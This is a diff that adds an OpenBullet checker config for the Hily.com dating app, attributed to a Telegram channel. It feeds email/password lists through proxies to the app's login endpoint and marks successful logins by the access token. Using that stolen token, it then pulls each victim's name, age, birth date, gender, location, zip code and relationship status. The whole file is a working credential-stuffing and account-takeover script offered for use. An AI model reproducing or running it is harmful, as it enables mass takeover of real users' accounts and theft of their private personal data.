@@ -1,0 +1,108 @@
+[SETTINGS]
+{
+  "Name": "Hily.com",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2022-02-12T08:33:09.2795239-05:00",
+  "AdditionalInfo": "Telegram Channel: @OpenBulletChannel | Full Capture | Move BullShit Acc To Custom | CPM Rate: 100-2000",
+  "RequiredPlugins": [],
+  "Author": "@TheOwn",
+  "Version": "1.2.2",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "SaveHitsToTextFile": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#US FUNCTION URLEncode "<USER>" -> VAR "US" 
+
+#PS FUNCTION URLEncode "<PASS>" -> VAR "PS" 
+
+REQUEST POST "https://auth.hily.com/login" 
+  CONTENT "email=<US>&pwd=<PS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded; charset=utf-8" 
+  HEADER "Host: auth.hily.com" 
+  HEADER "Accept: */*" 
+  HEADER "Connection: close" 
+  HEADER "locale: en_US@calendar=gregorian" 
+  HEADER "Device-id: BA5BA9A8-6878-45D8-A43F-78704FC717E7" 
+  HEADER "theme: light" 
+  HEADER "Accept-Language: en-US;q=1.0, fa-IR;q=0.9, en-IR;q=0.8, ar-IR;q=0.7" 
+  HEADER "User-Agent: Hily/5.07 (com.hily.ios; build:222; iOS 12.4.3) Alamofire/4.9.1" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "Content-Length: 46" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "No such user" 
+    KEY "Email or password is incorrect" 
+  KEYCHAIN Success OR 
+    KEY "accessToken" 
+
+#Tok PARSE "<SOURCE>" JSON "accessToken" -> VAR "Tok" 
+
+REQUEST GET "https://app.hily.com/user/me" 
+  
+  HEADER "Authorization: Bearer <Tok>" 
+  HEADER "Host: auth.hily.com" 
+  HEADER "Accept: */*" 
+  HEADER "Connection: close" 
+  HEADER "locale: en_US@calendar=gregorian" 
+  HEADER "Device-id: BA5BA9A8-6878-45D8-A43F-78704FC717E7" 
+  HEADER "theme: light" 
+  HEADER "Accept-Language: en-US;q=1.0, fa-IR;q=0.9, en-IR;q=0.8, ar-IR;q=0.7" 
+  HEADER "User-Agent: Hily/5.07 (com.hily.ios; build:222; iOS 12.4.3) Alamofire/4.9.1" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "Content-Length: 46" 
+
+#name PARSE "<SOURCE>" JSON "name" CreateEmpty=FALSE -> CAP "name" 
+
+#age PARSE "<SOURCE>" JSON "age" CreateEmpty=FALSE -> CAP "age" 
+
+#gender PARSE "<SOURCE>" JSON "gender" CreateEmpty=FALSE -> CAP "gender" 
+
+#birthDate PARSE "<SOURCE>" JSON "birthDate" CreateEmpty=FALSE -> CAP "birthDate" 
+
+#photosCount PARSE "<SOURCE>" JSON "photosCount" CreateEmpty=FALSE -> CAP "photosCount" 
+
+#geoCity PARSE "<SOURCE>" JSON "geoCity" CreateEmpty=FALSE -> CAP "geoCity" 
+
+#locale PARSE "<SOURCE>" JSON "locale" CreateEmpty=FALSE -> CAP "locale" 
+
+#geoState PARSE "<SOURCE>" JSON "geoState" CreateEmpty=FALSE -> CAP "geoState" 
+
+#geoZipcode PARSE "<SOURCE>" JSON "geoZipcode" CreateEmpty=FALSE -> CAP "geoZipcode" 
+
+#relationshipStatus PARSE "<SOURCE>" JSON "relationshipStatus" CreateEmpty=FALSE -> CAP "relationshipStatus" 
+
+#verifications PARSE "<SOURCE>" JSON "verifications" CreateEmpty=FALSE -> CAP "verifications" 
+
+#streams PARSE "<SOURCE>" JSON "streams" CreateEmpty=FALSE -> CAP "streams" 
+
+#acceptStreamRules PARSE "<SOURCE>" JSON "acceptStreamRules" CreateEmpty=FALSE -> CAP "acceptStreamRules" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "2FACTOR" OR 
+    KEY "Suspended" 
+
